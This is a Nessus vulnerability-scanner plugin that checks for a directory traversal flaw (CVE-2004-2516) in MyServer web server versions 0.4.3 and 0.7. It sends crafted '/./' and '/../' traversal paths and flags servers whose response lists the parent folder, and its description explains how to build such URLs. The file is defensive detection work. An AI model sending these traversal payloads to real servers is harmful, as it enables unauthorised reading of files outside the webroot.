#
# This script was written by Paul Johnston of Westpoint Ltd <paul@westpoint.ltd.uk>
#
# See the Nessus Scripts License for details
#

# Changes by Tenable:
# - Revised plugin title, added VDB refs, changed family (4/20/009)


include("compat.inc");

if(description)
{
 script_id(11851);
 script_version ("$Revision: 1.8 $");
 script_cve_id("CVE-2004-2516");
 script_bugtraq_id(11189); 
 script_xref(name:"OSVDB", value:"10001");

 script_name(english:"MyServer 0.4.3 / 0.7 Crafted Traversal Arbitrary File Access");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server is affected by an information disclosure 
vulnerability." );
 script_set_attribute(attribute:"description", value:
"This web server is running MyServer <= 0.4.3 or 0.7. This version 
contains a directory traversal vulnerability, that allows remote users
with no authentication to read files outside the webroot.

You have to create a dot-dot URL with the same number of '/./' and 
'/../' + 1." );
 script_set_attribute(attribute:"see_also", value:"http://archives.neohapsis.com/archives/vulnwatch/2004-q3/0052.html" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to MyServer 0.7.1 or later." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:L/Au:N/C:P/I:N/A:N" );


script_end_attributes();


 summary["english"] = "Attempts to retrieve the path '/././..'";
 script_summary(english:summary["english"]);

 script_category(ACT_ATTACK);
 script_copyright(english:"Author Paul Johnston paul@westpoint.ltd.uk, Copyright (C) 2003-2009 Westpoint Ltd");
 script_family(english:"Web Servers");

 script_dependencie("find_service1.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);

 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

# In fact, MyServer 0.7 is also vulnerable to the first URL.
# However, as the bug was supposed to be fixed in 0.4.3 and reappeared in 
# 0.7, I think that checking every avatar is safer.

foreach pattern (make_list("/././..", "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././../../../../../../../../"))
{
 req = http_get(item: pattern, port:port);
 res = http_keepalive_send_recv(port:port, data:req);
 if(res == NULL) exit(0);

 if(ereg(pattern:"^HTTP/[0-9]\.[0-9] 200 ", string:res)
    && egrep(pattern:"Contents of folder \.\.", string:res, icase:1))
 {
  security_warning(port);
  exit(0);
 }
}
